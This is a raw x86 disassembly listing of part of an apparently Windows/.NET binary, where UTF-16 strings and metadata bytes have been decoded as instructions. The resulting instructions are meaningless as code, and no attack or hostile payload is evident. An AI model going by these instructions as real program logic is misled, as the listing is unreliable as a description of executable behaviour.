  40a284:	jne    0x40a286
  40a286:	je     0x40a288
  40a288:	dec    edi
  40a289:	add    BYTE PTR [edx+0x0],ah
  40a28c:	push   0x0
  40a28e:	add    BYTE PTR gs:[ebx+0x0],ah
  40a292:	je     0x40a294
  40a294:	dec    esp
  40a295:	add    BYTE PTR [ecx+0x0],ah
  40a298:	jns    0x40a29a
  40a29a:	add    BYTE PTR gs:[edx+0x0],dh
  40a29e:	inc    esp
  40a29f:	add    BYTE PTR [ebp+0x0],ah
  40a2a2:	jae    0x40a2a4
  40a2a4:	arpl   WORD PTR [eax],ax
  40a2a6:	jb     0x40a2a8
  40a2a8:	imul   eax,DWORD PTR [eax],0x740070
  40a2ae:	imul   eax,DWORD PTR [eax],0x6e006f
  40a2b4:	add    BYTE PTR ds:0x730055,bh
  40a2ba:	popa   
  40a2bb:	add    BYTE PTR [edi+0x0],ah
  40a2be:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  40a2c3:	add    BYTE PTR [esi+0x0],ch
  40a2c6:	add    BYTE PTR [di+0x0],dh
  40a2ca:	popa   
  40a2cb:	add    BYTE PTR [edi+0x0],ah
  40a2ce:	add    BYTE PTR gs:[ebx+0x0],al
  40a2d2:	push   ebx
  40a2d3:	add    BYTE PTR [eax+0x0],ch
  40a2d6:	popa   
  40a2d7:	add    BYTE PTR [edx+0x0],dh
  40a2da:	jo     0x40a2dc
  40a2dc:	inc    esp
  40a2dd:	add    BYTE PTR [ebp+0x0],ah
  40a2e0:	jae    0x40a2e2
  40a2e2:	arpl   WORD PTR [eax],ax
  40a2e4:	jb     0x40a2e6
  40a2e6:	imul   eax,DWORD PTR [eax],0x740070
  40a2ec:	imul   eax,DWORD PTR [eax],0x6e006f
  40a2f2:	add    BYTE PTR ds:0x730055,dh
  40a2f8:	popa   
  40a2f9:	add    BYTE PTR [edi+0x0],ah
  40a2fc:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  40a301:	add    BYTE PTR [esi+0x0],ch
  40a304:	add    BYTE PTR [di+0x0],dh
  40a308:	popa   
  40a309:	add    BYTE PTR [edi+0x0],ah
  40a30c:	add    BYTE PTR gs:[esi+0x0],dl
  40a310:	bound  eax,QWORD PTR [eax]
  40a312:	inc    esp
  40a313:	add    BYTE PTR [ebp+0x0],ah
  40a316:	jae    0x40a318
  40a318:	arpl   WORD PTR [eax],ax
  40a31a:	jb     0x40a31c
  40a31c:	imul   eax,DWORD PTR [eax],0x740070
  40a322:	imul   eax,DWORD PTR [eax],0x6e006f
  40a328:	add    BYTE PTR ds:0x730055,ch
  40a32e:	popa   
  40a32f:	add    BYTE PTR [edi+0x0],ah
  40a332:	add    BYTE PTR gs:[esi+0x0],cl
  40a336:	outs   dx,DWORD PTR ds:[esi]
  40a337:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40a33b:	add    BYTE PTR [edi+0x0],ah
  40a33e:	outs   dx,DWORD PTR ds:[esi]
  40a33f:	add    BYTE PTR [eax+eax*1+0x65],al
  40a343:	add    BYTE PTR [ebx+0x0],dh
  40a346:	arpl   WORD PTR [eax],ax
  40a348:	jb     0x40a34a
  40a34a:	imul   eax,DWORD PTR [eax],0x740070
  40a350:	imul   eax,DWORD PTR [eax],0x6e006f
  40a356:	add    BYTE PTR [ebx],ah
  40a358:	push   ebp
  40a359:	add    BYTE PTR [ebx+0x0],dh
  40a35c:	popa   
  40a35d:	add    BYTE PTR [edi+0x0],ah
  40a360:	add    BYTE PTR gs:[ebp+0x0],dl
  40a364:	jb     0x40a366
  40a366:	imul   eax,DWORD PTR [eax],0x610056
  40a36c:	ins    BYTE PTR es:[edi],dx
  40a36d:	add    BYTE PTR [ebp+0x0],dh
  40a370:	add    BYTE PTR gs:[esi+0x0],cl
  40a374:	popa   
  40a375:	add    BYTE PTR [ebp+0x0],ch
  40a378:	add    BYTE PTR gs:[eax],al
  40a37b:	and    eax,0x730055
  40a380:	popa   
  40a381:	add    BYTE PTR [edi+0x0],ah
  40a384:	add    BYTE PTR gs:[esi+0x0],al
  40a388:	imul   eax,DWORD PTR [eax],0x65006c
  40a38e:	push   esi
  40a38f:	add    BYTE PTR [ecx+0x0],ah
  40a392:	ins    BYTE PTR es:[edi],dx
  40a393:	add    BYTE PTR [ebp+0x0],dh
  40a396:	add    BYTE PTR gs:[esi+0x0],cl
  40a39a:	popa   
  40a39b:	add    BYTE PTR [ebp+0x0],ch
  40a39e:	add    BYTE PTR gs:[eax],al
  40a3a1:	xor    eax,0x730055
  40a3a6:	popa   
  40a3a7:	add    BYTE PTR [edi+0x0],ah
  40a3aa:	add    BYTE PTR gs:[eax+eax*1+0x61],al
  40a3af:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a3b3:	add    BYTE PTR [ebx+0x0],dl
  40a3b6:	add    BYTE PTR gs:[edx+0x0],dh
  40a3ba:	jbe    0x40a3bc
  40a3bc:	imul   eax,DWORD PTR [eax],0x650063
  40a3c2:	inc    ebx
  40a3c3:	add    BYTE PTR [edi+0x0],ch
  40a3c6:	ins    BYTE PTR es:[edi],dx
  40a3c7:	add    BYTE PTR [eax+eax*1+0x65],ch
  40a3cb:	add    BYTE PTR [ebx+0x0],ah
  40a3ce:	je     0x40a3d0
  40a3d0:	imul   eax,DWORD PTR [eax],0x6e006f
  40a3d6:	add    BYTE PTR [ebx],ah
  40a3d8:	push   ebp
  40a3d9:	add    BYTE PTR [ebx+0x0],dh
  40a3dc:	popa   
  40a3dd:	add    BYTE PTR [edi+0x0],ah
  40a3e0:	add    BYTE PTR gs:[esi+0x0],dl
  40a3e4:	add    BYTE PTR gs:[edx+0x0],dh
  40a3e8:	jae    0x40a3ea
  40a3ea:	imul   eax,DWORD PTR [eax],0x6e006f
  40a3f0:	xor    DWORD PTR [eax],eax
  40a3f2:	inc    esp
  40a3f3:	add    BYTE PTR [edi+0x0],ch
  40a3f6:	je     0x40a3f8
  40a3f8:	xor    BYTE PTR [eax],al
  40a3fa:	add    BYTE PTR [ebx],ah
  40a3fc:	push   ebp
  40a3fd:	add    BYTE PTR [ebx+0x0],dh
  40a400:	popa   
  40a401:	add    BYTE PTR [edi+0x0],ah
  40a404:	add    BYTE PTR gs:[esi+0x0],dl
  40a408:	add    BYTE PTR gs:[edx+0x0],dh
  40a40c:	jae    0x40a40e
  40a40e:	imul   eax,DWORD PTR [eax],0x6e006f
  40a414:	xor    al,BYTE PTR [eax]
  40a416:	inc    esp
  40a417:	add    BYTE PTR [edi+0x0],ch
  40a41a:	je     0x40a41c
  40a41c:	xor    BYTE PTR [eax],al
  40a41e:	add    BYTE PTR [ecx],bl
  40a420:	inc    ebp
  40a421:	add    BYTE PTR [eax+0x0],bh
  40a424:	popa   
  40a425:	add    BYTE PTR [ebp+0x0],ch
  40a428:	jo     0x40a42a
  40a42a:	ins    BYTE PTR es:[edi],dx
  40a42b:	add    BYTE PTR [ebp+0x0],ah
  40a42e:	push   esp
  40a42f:	add    BYTE PTR [ecx+0x0],ch
  40a432:	je     0x40a434
  40a434:	ins    BYTE PTR es:[edi],dx
  40a435:	add    BYTE PTR [ebp+0x0],ah
  40a438:	add    BYTE PTR [ecx],dl
  40a43a:	inc    ebp
  40a43b:	add    BYTE PTR [eax+0x0],bh
  40a43e:	popa   
  40a43f:	add    BYTE PTR [ebp+0x0],ch
  40a442:	jo     0x40a444
  40a444:	ins    BYTE PTR es:[edi],dx
  40a445:	add    BYTE PTR [ebp+0x0],ah
  40a448:	xor    al,0x0
  40a44a:	add    BYTE PTR [edi],ah
  40a44c:	inc    ebp
  40a44d:	add    BYTE PTR [eax+0x0],bh
  40a450:	popa   
  40a451:	add    BYTE PTR [ebp+0x0],ch
  40a454:	jo     0x40a456
  40a456:	ins    BYTE PTR es:[edi],dx
  40a457:	add    BYTE PTR [ebp+0x0],ah
  40a45a:	xor    al,0x0
  40a45c:	inc    esp
  40a45d:	add    BYTE PTR [ebp+0x0],ah
  40a460:	jae    0x40a462
  40a462:	arpl   WORD PTR [eax],ax
  40a464:	jb     0x40a466
  40a466:	imul   eax,DWORD PTR [eax],0x740070
  40a46c:	imul   eax,DWORD PTR [eax],0x6e006f
  40a472:	add    BYTE PTR [ecx],dl
  40a474:	inc    ebp
  40a475:	add    BYTE PTR [eax+0x0],bh
  40a478:	popa   
  40a479:	add    BYTE PTR [ebp+0x0],ch
  40a47c:	jo     0x40a47e
  40a47e:	ins    BYTE PTR es:[edi],dx
  40a47f:	add    BYTE PTR [ebp+0x0],ah
  40a482:	xor    eax,0x45270000
  40a487:	add    BYTE PTR [eax+0x0],bh
  40a48a:	popa   
  40a48b:	add    BYTE PTR [ebp+0x0],ch
  40a48e:	jo     0x40a490
  40a490:	ins    BYTE PTR es:[edi],dx
  40a491:	add    BYTE PTR [ebp+0x0],ah
  40a494:	xor    eax,0x65004400
  40a499:	add    BYTE PTR [ebx+0x0],dh
  40a49c:	arpl   WORD PTR [eax],ax
  40a49e:	jb     0x40a4a0
  40a4a0:	imul   eax,DWORD PTR [eax],0x740070
  40a4a6:	imul   eax,DWORD PTR [eax],0x6e006f
  40a4ac:	add    BYTE PTR [ecx],dl
  40a4ae:	inc    ebp
  40a4af:	add    BYTE PTR [eax+0x0],bh
  40a4b2:	popa   
  40a4b3:	add    BYTE PTR [ebp+0x0],ch
  40a4b6:	jo     0x40a4b8
  40a4b8:	ins    BYTE PTR es:[edi],dx
  40a4b9:	add    BYTE PTR [ebp+0x0],ah
  40a4bc:	add    BYTE PTR ss:[eax],al
  40a4bf:	daa    
  40a4c0:	inc    ebp
  40a4c1:	add    BYTE PTR [eax+0x0],bh
  40a4c4:	popa   
  40a4c5:	add    BYTE PTR [ebp+0x0],ch
  40a4c8:	jo     0x40a4ca
  40a4ca:	ins    BYTE PTR es:[edi],dx
  40a4cb:	add    BYTE PTR [ebp+0x0],ah
  40a4ce:	add    BYTE PTR ss:[eax+eax*1+0x65],al
  40a4d3:	add    BYTE PTR [ebx+0x0],dh
  40a4d6:	arpl   WORD PTR [eax],ax
  40a4d8:	jb     0x40a4da
  40a4da:	imul   eax,DWORD PTR [eax],0x740070
  40a4e0:	imul   eax,DWORD PTR [eax],0x6e006f
  40a4e6:	add    BYTE PTR [edi],dl
  40a4e8:	dec    esi
  40a4e9:	add    BYTE PTR [edi+0x0],ch
  40a4ec:	inc    ecx
  40a4ed:	add    BYTE PTR [edx+0x0],dh
  40a4f0:	add    BYTE PTR [di+0x0],dh
  40a4f4:	ins    DWORD PTR es:[edi],dx
  40a4f5:	add    BYTE PTR [ebp+0x0],ah
  40a4f8:	outs   dx,BYTE PTR ds:[esi]
  40a4f9:	add    BYTE PTR [eax+eax*1+0x73],dh
  40a4fd:	add    BYTE PTR [eax],al
  40a4ff:	sub    DWORD PTR [edx+0x0],eax
  40a502:	popa   
  40a503:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40a507:	add    BYTE PTR [ecx+0x0],bh
  40a50a:	inc    esi
  40a50b:	add    BYTE PTR [edi+0x0],ch
  40a50e:	jb     0x40a510
  40a510:	ins    DWORD PTR es:[edi],dx
  40a511:	add    BYTE PTR [ebp+0x0],ah
  40a514:	add    BYTE PTR fs:[eax+0x0],dl
  40a518:	popa   
  40a519:	add    BYTE PTR [edx+0x0],dh
  40a51c:	popa   
  40a51d:	add    BYTE PTR [ebp+0x0],ch
  40a520:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40a525:	add    BYTE PTR [edx+0x0],dh
  40a528:	add    BYTE PTR ds:0x6e0049,ah
  40a52e:	jbe    0x40a530
  40a530:	popa   
  40a531:	add    BYTE PTR [eax+eax*1+0x69],ch
  40a535:	add    BYTE PTR [eax+eax*1+0x50],ah
  40a539:	add    BYTE PTR [ecx+0x0],ah
  40a53c:	jb     0x40a53e
  40a53e:	popa   
  40a53f:	add    BYTE PTR [ebp+0x0],ch
  40a542:	push   ebx
  40a543:	add    BYTE PTR [edi+0x0],dh
  40a546:	imul   eax,DWORD PTR [eax],0x630074
  40a54c:	push   0x492b0000
  40a551:	add    BYTE PTR [esi+0x0],ch
  40a554:	jbe    0x40a556
  40a556:	popa   
  40a557:	add    BYTE PTR [eax+eax*1+0x69],ch
  40a55b:	add    BYTE PTR [eax+eax*1+0x45],ah
  40a55f:	add    BYTE PTR [esi+0x0],ch
  40a562:	jne    0x40a564
  40a564:	ins    DWORD PTR es:[edi],dx
  40a565:	add    BYTE PTR [eax+0x0],dl
  40a568:	popa   
  40a569:	add    BYTE PTR [edx+0x0],dh
  40a56c:	popa   
  40a56d:	add    BYTE PTR [ebp+0x0],ch
  40a570:	push   esi
  40a571:	add    BYTE PTR [ecx+0x0],ah
  40a574:	ins    BYTE PTR es:[edi],dx
  40a575:	add    BYTE PTR [ebp+0x0],dh
  40a578:	add    BYTE PTR gs:[eax],al
  40a57b:	and    ecx,DWORD PTR [ebp+0x0]
  40a57e:	imul   eax,DWORD PTR [eax],0x730073
  40a584:	imul   eax,DWORD PTR [eax],0x67006e
  40a58a:	push   eax
  40a58b:	add    BYTE PTR [ecx+0x0],ah
  40a58e:	jb     0x40a590
  40a590:	popa   
  40a591:	add    BYTE PTR [ebp+0x0],ch
  40a594:	push   esi
  40a595:	add    BYTE PTR [ecx+0x0],ah
  40a598:	ins    BYTE PTR es:[edi],dx
  40a599:	add    BYTE PTR [ebp+0x0],dh
  40a59c:	add    BYTE PTR gs:[eax],al
  40a59f:	sub    DWORD PTR [ebp+0x0],ecx
  40a5a2:	imul   eax,DWORD PTR [eax],0x730073
  40a5a8:	imul   eax,DWORD PTR [eax],0x67006e
  40a5ae:	push   edx
  40a5af:	add    BYTE PTR [ebp+0x0],ah
  40a5b2:	jno    0x40a5b4
  40a5b4:	jne    0x40a5b6
  40a5b6:	imul   eax,DWORD PTR [eax],0x650072
  40a5bc:	add    BYTE PTR fs:[eax+0x0],dl
  40a5c0:	popa   
  40a5c1:	add    BYTE PTR [edx+0x0],dh
  40a5c4:	popa   
  40a5c5:	add    BYTE PTR [ebp+0x0],ch
  40a5c8:	add    BYTE PTR [edi],bl
  40a5ca:	dec    ebp
  40a5cb:	add    BYTE PTR [ecx+0x0],ch
  40a5ce:	jae    0x40a5d0
  40a5d0:	jae    0x40a5d2
  40a5d2:	imul   eax,DWORD PTR [eax],0x67006e
  40a5d8:	inc    esi
  40a5d9:	add    BYTE PTR [ecx+0x0],ch
  40a5dc:	ins    BYTE PTR es:[edi],dx
  40a5dd:	add    BYTE PTR [ebp+0x0],ah
  40a5e0:	dec    esi
  40a5e1:	add    BYTE PTR [ecx+0x0],ah
  40a5e4:	ins    DWORD PTR es:[edi],dx
  40a5e5:	add    BYTE PTR [ebp+0x0],ah
  40a5e8:	add    BYTE PTR [ecx],bh
  40a5ea:	push   ebp
  40a5eb:	add    BYTE PTR [esi+0x0],ch
  40a5ee:	popa   
  40a5ef:	add    BYTE PTR [edx+0x0],ah
  40a5f2:	ins    BYTE PTR es:[edi],dx
  40a5f3:	add    BYTE PTR [ebp+0x0],ah
  40a5f6:	push   esp
  40a5f7:	add    BYTE PTR [edi+0x0],ch
  40a5fa:	inc    esi
  40a5fb:	add    BYTE PTR [ecx+0x0],ch
  40a5fe:	outs   dx,BYTE PTR ds:[esi]
  40a5ff:	add    BYTE PTR [eax+eax*1+0x53],ah
  40a603:	add    BYTE PTR [eax+0x0],dh
  40a606:	add    BYTE PTR gs:[ebx+0x0],ah
  40a60a:	imul   eax,DWORD PTR [eax],0x690066
  40a610:	add    BYTE PTR gs:[eax+eax*1+0x44],ah
  40a615:	add    BYTE PTR [ecx+0x0],ch
  40a618:	jb     0x40a61a
  40a61a:	push   eax
  40a61b:	add    BYTE PTR [ecx+0x0],ah
  40a61e:	je     0x40a620
  40a620:	push   0x502d0000
  40a625:	add    BYTE PTR [ecx+0x0],ah
  40a628:	je     0x40a62a
  40a62a:	push   0x72004100
  40a62f:	add    BYTE PTR [edi+0x0],ah
  40a632:	jne    0x40a634
  40a634:	ins    DWORD PTR es:[edi],dx
  40a635:	add    BYTE PTR [ebp+0x0],ah
  40a638:	outs   dx,BYTE PTR ds:[esi]
  40a639:	add    BYTE PTR [eax+eax*1+0x49],dh
  40a63d:	add    BYTE PTR [ebx+0x0],dh
  40a640:	dec    esi
  40a641:	add    BYTE PTR [edi+0x0],ch
  40a644:	je     0x40a646
  40a646:	push   esi
  40a647:	add    BYTE PTR [ecx+0x0],ah
  40a64a:	ins    BYTE PTR es:[edi],dx
  40a64b:	add    BYTE PTR [ecx+0x0],ch
  40a64e:	add    BYTE PTR fs:[eax],al
  40a651:	pop    ds
  40a652:	dec    ecx
  40a653:	add    BYTE PTR [esi+0x0],ch
  40a656:	jbe    0x40a658
  40a658:	popa   
  40a659:	add    BYTE PTR [eax+eax*1+0x69],ch
  40a65d:	add    BYTE PTR [eax+eax*1+0x46],ah
  40a661:	add    BYTE PTR [ecx+0x0],ch
  40a664:	ins    BYTE PTR es:[edi],dx
  40a665:	add    BYTE PTR [ebp+0x0],ah
  40a668:	push   esp
  40a669:	add    BYTE PTR [ecx+0x0],bh
  40a66c:	jo     0x40a66e
  40a66e:	add    BYTE PTR gs:[eax],al
  40a671:	aaa    
  40a672:	inc    ebp
  40a673:	add    BYTE PTR [eax+eax*1+0x6d],ah
  40a677:	add    BYTE PTR [ebx+0x0],dl
  40a67a:	arpl   WORD PTR [eax],ax
  40a67c:	push   0x6d006500
  40a681:	add    BYTE PTR [ecx+0x0],ah
  40a684:	inc    ebp
  40a685:	add    BYTE PTR [edx+0x0],dh
  40a688:	jb     0x40a68a
  40a68a:	outs   dx,DWORD PTR ds:[esi]
  40a68b:	add    BYTE PTR [edx+0x0],dh
  40a68e:	push   ebx
  40a68f:	add    BYTE PTR [ebp+0x0],ah
  40a692:	jbe    0x40a694
  40a694:	add    BYTE PTR gs:[edx+0x0],dh
  40a698:	imul   eax,DWORD PTR [eax],0x790074
  40a69e:	inc    ebp
  40a69f:	add    BYTE PTR [edx+0x0],dh
  40a6a2:	jb     0x40a6a4
  40a6a4:	outs   dx,DWORD PTR ds:[esi]
  40a6a5:	add    BYTE PTR [edx+0x0],dh
  40a6a8:	add    BYTE PTR [ebx],bh
  40a6aa:	inc    ebp
  40a6ab:	add    BYTE PTR [eax+eax*1+0x6d],ah
  40a6af:	add    BYTE PTR [ebx+0x0],dl
  40a6b2:	arpl   WORD PTR [eax],ax
  40a6b4:	push   0x6d006500
  40a6b9:	add    BYTE PTR [ecx+0x0],ah
  40a6bc:	inc    ebp
  40a6bd:	add    BYTE PTR [edx+0x0],dh
  40a6c0:	jb     0x40a6c2
  40a6c2:	outs   dx,DWORD PTR ds:[esi]
  40a6c3:	add    BYTE PTR [edx+0x0],dh
  40a6c6:	push   ebx
  40a6c7:	add    BYTE PTR [ebp+0x0],ah
  40a6ca:	jbe    0x40a6cc
  40a6cc:	add    BYTE PTR gs:[edx+0x0],dh
  40a6d0:	imul   eax,DWORD PTR [eax],0x790074
  40a6d6:	push   edi
  40a6d7:	add    BYTE PTR [ecx+0x0],ah
  40a6da:	jb     0x40a6dc
  40a6dc:	outs   dx,BYTE PTR ds:[esi]
  40a6dd:	add    BYTE PTR [ecx+0x0],ch
  40a6e0:	outs   dx,BYTE PTR ds:[esi]
  40a6e1:	add    BYTE PTR [edi+0x0],ah
  40a6e4:	add    BYTE PTR [ebx],bh
  40a6e6:	inc    ebp
  40a6e7:	add    BYTE PTR [eax+eax*1+0x6d],ah
  40a6eb:	add    BYTE PTR [ebx+0x0],dl
  40a6ee:	arpl   WORD PTR [eax],ax
  40a6f0:	push   0x6d006500
  40a6f5:	add    BYTE PTR [ecx+0x0],ah
  40a6f8:	inc    ebp
  40a6f9:	add    BYTE PTR [edx+0x0],dh
  40a6fc:	jb     0x40a6fe
  40a6fe:	outs   dx,DWORD PTR ds:[esi]
  40a6ff:	add    BYTE PTR [edx+0x0],dh
  40a702:	push   ebx
  40a703:	add    BYTE PTR [ebp+0x0],ah
  40a706:	jbe    0x40a708
  40a708:	add    BYTE PTR gs:[edx+0x0],dh
  40a70c:	imul   eax,DWORD PTR [eax],0x790074
  40a712:	push   ebp
  40a713:	add    BYTE PTR [esi+0x0],ch
  40a716:	imul   eax,DWORD PTR [eax],0x6e
  40a719:	add    BYTE PTR [edi+0x0],ch
  40a71c:	ja     0x40a71e
  40a71e:	outs   dx,BYTE PTR ds:[esi]
  40a71f:	add    BYTE PTR [eax],al
  40a721:	pop    ss
  40a722:	inc    esi
  40a723:	add    BYTE PTR [ecx+0x0],ch
  40a726:	ins    BYTE PTR es:[edi],dx
  40a727:	add    BYTE PTR [ebp+0x0],ah
  40a72a:	push   ebp
  40a72b:	add    BYTE PTR [esi+0x0],ch
  40a72e:	imul   eax,DWORD PTR [eax],0x6e
  40a731:	add    BYTE PTR [edi+0x0],ch
  40a734:	ja     0x40a736
  40a736:	outs   dx,BYTE PTR ds:[esi]
  40a737:	add    BYTE PTR [eax],al
  40a739:	sub    ebx,DWORD PTR [edx+0x0]
  40a73c:	add    BYTE PTR gs:[edx+0x0],dh
  40a740:	outs   dx,DWORD PTR ds:[esi]
  40a741:	add    BYTE PTR [esi+0x0],al
  40a744:	imul   eax,DWORD PTR [eax],0x65006c
  40a74a:	jae    0x40a74c
  40a74c:	inc    esi
  40a74d:	add    BYTE PTR [edi+0x0],ch
  40a750:	jb     0x40a752
  40a752:	push   eax
  40a753:	add    BYTE PTR [ecx+0x0],ah
  40a756:	jb     0x40a758
  40a758:	popa   
  40a759:	add    BYTE PTR [ebp+0x0],ch
  40a75c:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40a761:	add    BYTE PTR [edx+0x0],dh
  40a764:	add    BYTE PTR [ecx],dh
  40a766:	push   esp
  40a767:	add    BYTE PTR [edi+0x0],ch
  40a76a:	outs   dx,DWORD PTR ds:[esi]
  40a76b:	add    BYTE PTR [ebp+0x0],cl
  40a76e:	popa   
  40a76f:	add    BYTE PTR [esi+0x0],ch
  40a772:	jns    0x40a774
  40a774:	inc    esi
  40a775:	add    BYTE PTR [ecx+0x0],ch
  40a778:	ins    BYTE PTR es:[edi],dx
  40a779:	add    BYTE PTR [ebp+0x0],ah
  40a77c:	jae    0x40a77e
  40a77e:	inc    esi
  40a77f:	add    BYTE PTR [edi+0x0],ch
  40a782:	jb     0x40a784
  40a784:	push   eax
  40a785:	add    BYTE PTR [ecx+0x0],ah
  40a788:	jb     0x40a78a
  40a78a:	popa   
  40a78b:	add    BYTE PTR [ebp+0x0],ch
  40a78e:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40a793:	add    BYTE PTR [edx+0x0],dh
  40a796:	add    BYTE PTR [ecx],bl
  40a798:	inc    ebp
  40a799:	add    BYTE PTR [eax+0x0],bh
  40a79c:	arpl   WORD PTR [eax],ax
  40a79e:	ins    BYTE PTR es:[edi],dx
  40a79f:	add    BYTE PTR [ebp+0x0],dh
  40a7a2:	jae    0x40a7a4
  40a7a4:	imul   eax,DWORD PTR [eax],0x650076
  40a7aa:	push   ebp
  40a7ab:	add    BYTE PTR [edx+0x0],dh
  40a7ae:	imul   eax,DWORD PTR [eax],0x565d00
  40a7b4:	add    BYTE PTR gs:[edx+0x0],dh
  40a7b8:	jae    0x40a7ba
  40a7ba:	imul   eax,DWORD PTR [eax],0x6e006f
  40a7c0:	push   esi
  40a7c1:	add    BYTE PTR [ecx],dh
  40a7c3:	add    BYTE PTR [edx+0x0],dl
  40a7c6:	add    BYTE PTR gs:[ecx+0x0],dh
  40a7ca:	jne    0x40a7cc
  40a7cc:	imul   eax,DWORD PTR [eax],0x650072
  40a7d2:	jae    0x40a7d4
  40a7d4:	push   ebp
  40a7d5:	add    BYTE PTR [ebx+0x0],dh
  40a7d8:	add    BYTE PTR gs:[eax+eax*1+0x61],al
  40a7dd:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a7e1:	add    BYTE PTR [ebx+0x0],dl
  40a7e4:	add    BYTE PTR gs:[edx+0x0],dh
  40a7e8:	jbe    0x40a7ea
  40a7ea:	imul   eax,DWORD PTR [eax],0x650063
  40a7f0:	inc    ebx
  40a7f1:	add    BYTE PTR [edi+0x0],ch
  40a7f4:	ins    BYTE PTR es:[edi],dx
  40a7f5:	add    BYTE PTR [eax+eax*1+0x65],ch
  40a7f9:	add    BYTE PTR [ebx+0x0],ah
  40a7fc:	je     0x40a7fe
  40a7fe:	imul   eax,DWORD PTR [eax],0x6e006f
  40a804:	inc    esi
  40a805:	add    BYTE PTR [ecx+0x0],ah
  40a808:	ins    BYTE PTR es:[edi],dx
  40a809:	add    BYTE PTR [ebx+0x0],dh
  40a80c:	add    BYTE PTR gs:[eax],al
  40a80f:	pop    ss
  40a810:	inc    esp
  40a811:	add    BYTE PTR [ecx+0x0],ah
  40a814:	je     0x40a816
  40a816:	popa   
  40a817:	add    BYTE PTR [ebx+0x0],dl
  40a81a:	jbe    0x40a81c
  40a81c:	arpl   WORD PTR [eax],ax
  40a81e:	push   ebp
  40a81f:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a823:	add    BYTE PTR [eax+eax*1+0x0],ch
  40a827:	pop    es
  40a828:	add    BYTE PTR cs:[esi],ch
  40a82b:	add    BYTE PTR [esi],ch
  40a82d:	add    BYTE PTR [eax],al
  40a82f:	add    BYTE PTR [eax+0x3fee2919],ch
  40a835:	xor    ch,cl
  40a837:	inc    edx
  40a838:	mov    dl,0x95
  40a83a:	mov    dh,0x5b
  40a83c:	jo     0x40a8ae
  40a83e:	cmp    DWORD PTR [edi+0x0],ebp
  40a841:	or     BYTE PTR [edi+0x19565c7a],dh
  40a847:	xor    al,0xe0
  40a849:	mov    DWORD PTR ds:0x1151215,eax
  40a84f:	push   cs
  40a850:	add    eax,0x1191215
  40a855:	push   cs
  40a856:	add    al,BYTE PTR [esi]
  40a858:	push   cs
  40a859:	add    al,BYTE PTR [esi]
  40a85b:	add    al,BYTE PTR [edi]
  40a85d:	and    BYTE PTR [ecx+eax*1],al
  40a860:	push   cs
  40a861:	push   cs
  40a862:	push   cs
  40a863:	add    cl,BYTE PTR [eax]
  40a865:	and    BYTE PTR ds:0xe0e0e01,al
  40a86b:	push   cs
  40a86c:	add    cl,BYTE PTR [eax]
  40a86e:	and    BYTE PTR ds:0xe0e0e01,al
  40a874:	add    al,BYTE PTR [edx]
  40a876:	or     ah,BYTE PTR [eax]
  40a878:	pop    es
  40a879:	add    DWORD PTR [esi],ecx
  40a87b:	push   cs
  40a87c:	push   cs
  40a87d:	push   cs
  40a87e:	add    al,BYTE PTR [edx]
  40a880:	add    al,BYTE PTR [ebx]
  40a882:	and    BYTE PTR [eax],al
  40a884:	push   cs
  40a885:	add    esp,DWORD PTR [eax]
  40a887:	add    BYTE PTR [edx],al
  40a889:	add    ebp,DWORD PTR [eax]
  40a88b:	add    BYTE PTR [esi],cl
  40a88d:	add    ebp,DWORD PTR [eax]
  40a88f:	add    BYTE PTR [edx],al
  40a891:	push   es
  40a892:	xor    DWORD PTR [eax],eax
  40a894:	add    BYTE PTR cs:[eax],dh
  40a897:	add    BYTE PTR [esi],al
  40a899:	xor    al,BYTE PTR [eax]
  40a89b:	add    BYTE PTR cs:[eax],dh
  40a89e:	add    BYTE PTR [ebx],al
  40a8a0:	push   es
  40a8a1:	adc    ch,BYTE PTR ds:0x8120603
  40a8a7:	add    eax,DWORD PTR [esi]
  40a8a9:	adc    dl,BYTE PTR [eax+ecx*1]
  40a8ac:	push   es
  40a8ad:	adc    eax,0x8023112
  40a8b2:	adc    bl,BYTE PTR [eax]
  40a8b4:	or     DWORD PTR [eax],esp
  40a8b6:	add    eax,DWORD PTR [ecx]
  40a8b8:	adc    ch,BYTE PTR ds:0x14120812
  40a8be:	add    eax,0xe010220
  40a8c3:	push   cs
  40a8c4:	add    al,0x20
  40a8c6:	add    DWORD PTR [ecx],eax
  40a8c8:	sbb    al,0x5
  40a8ca:	and    BYTE PTR [edx],al
  40a8cc:	sbb    al,0xe
  40a8ce:	push   cs
  40a8cf:	add    eax,0xe1c0200
  40a8d4:	push   cs
  40a8d5:	add    esp,DWORD PTR [eax]
  40a8d7:	add    BYTE PTR [esp+eax*1],bl
  40a8da:	and    BYTE PTR [eax],al
  40a8dc:	adc    dl,BYTE PTR [esp+eax*1]
  40a8df:	and    BYTE PTR [eax],al
  40a8e1:	adc    ch,BYTE PTR ds:0x12002004
  40a8e7:	xor    eax,0x15002009
  40a8ec:	adc    dh,BYTE PTR [ecx]
  40a8ee:	add    cl,BYTE PTR [eax]
  40a8f0:	adc    bl,BYTE PTR [eax]
  40a8f2:	or     al,BYTE PTR [eax]
  40a8f4:	add    edx,DWORD PTR [edx]
  40a8f6:	or     al,0x12
  40a8f8:	sub    eax,0x14120812
  40a8fd:	add    al,0x28
  40a8ff:	add    BYTE PTR [edx],dl
  40a901:	adc    al,0x4
  40a903:	sub    BYTE PTR [eax],al
  40a905:	adc    ch,BYTE PTR ds:0x12002804
  40a90b:	xor    eax,0x15002809
  40a910:	adc    dh,BYTE PTR [ecx]
  40a912:	add    cl,BYTE PTR [eax]
  40a914:	adc    bl,BYTE PTR [eax]
  40a916:	push   cs
  40a917:	sub    eax,0x6f006e00
  40a91c:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40a920:	add    BYTE PTR [edi+0x0],ah
  40a923:	outs   dx,DWORD PTR ds:[esi]
  40a924:	add    BYTE PTR [esi],cl
  40a926:	das    
  40a927:	add    BYTE PTR [esi+0x0],ch
  40a92a:	outs   dx,DWORD PTR ds:[esi]
  40a92b:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40a92f:	add    BYTE PTR [edi+0x0],ah
  40a932:	outs   dx,DWORD PTR ds:[esi]
  40a933:	add    BYTE PTR [eax],cl
  40a935:	push   es
